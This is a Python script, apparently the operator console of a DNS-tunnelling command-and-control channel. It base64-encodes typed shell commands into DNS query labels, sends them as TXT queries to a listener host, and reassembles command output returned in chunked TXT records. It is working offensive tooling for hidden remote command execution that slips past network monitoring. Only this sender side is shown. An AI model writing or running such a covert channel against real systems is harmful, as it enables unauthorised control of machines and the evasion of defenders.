# dns_sender.py
import base64
from dnslib import DNSRecord
import time

DNS_SERVER = "192.168.10.25"  # Update with your listener's IP
DNS_PORT = 5300
DOMAIN = "dom.com"

def send_command(cmd):
    encoded_cmd = base64.b64encode(cmd.encode()).decode()
    labels = [encoded_cmd[i:i+50] for i in range(0, len(encoded_cmd), 50)]
    query_name = ".".join(labels) + f".{DOMAIN}"

    # Send initial command
    q = DNSRecord.question(query_name, qtype="TXT")
    response = q.send(DNS_SERVER, DNS_PORT, timeout=3)
    reply = DNSRecord.parse(response)

    first_txt = str(reply.rr[0].rdata).strip('"')
    print(f"[+] Received: {first_txt}")

    chunks = {}

    if first_txt.startswith("part-"):
        try:
            part_info, data = first_txt.split(":", 1)
            part_id = int(part_info.split("-")[1]) - 1
            total_parts = int(part_info.split("-")[3])
            chunks[part_id] = data
        except Exception as e:
            print(f"[!] Failed to parse first chunk: {e}")
            return

        # Fetch remaining chunks
        for i in range(1, total_parts):
            try:
                time.sleep(0.5)
                q = DNSRecord.question(f"{i}.{DOMAIN}", qtype="TXT")
                response = q.send(DNS_SERVER, DNS_PORT, timeout=3)
                reply = DNSRecord.parse(response)
                txt = str(reply.rr[0].rdata).strip('"')
                print(f"[+] Received: {txt}")

                if not txt.startswith("part-"):
                    print(f"[!] Skipping unexpected response: {txt}")
                    continue

                part_info, data = txt.split(":", 1)
                part_id = int(part_info.split("-")[1]) - 1
                chunks[part_id] = data
            except Exception as e:
                print(f"[!] Failed to get chunk {i}: {e}")

        # Reassemble and decode
        try:
            ordered = "".join(chunks[i] for i in sorted(chunks.keys()))
            decoded = base64.b64decode(ordered.encode()).decode()
            print(f"\n[+] Final Output:\n{decoded}")
        except Exception as e:
            print(f"[!] Failed to decode full output: {e}")
    else:
        print(f"\n[+] Output:\n{first_txt}")

if __name__ == "__main__":
    cmd = input("Enter command to send: ")
    send_command(cmd)
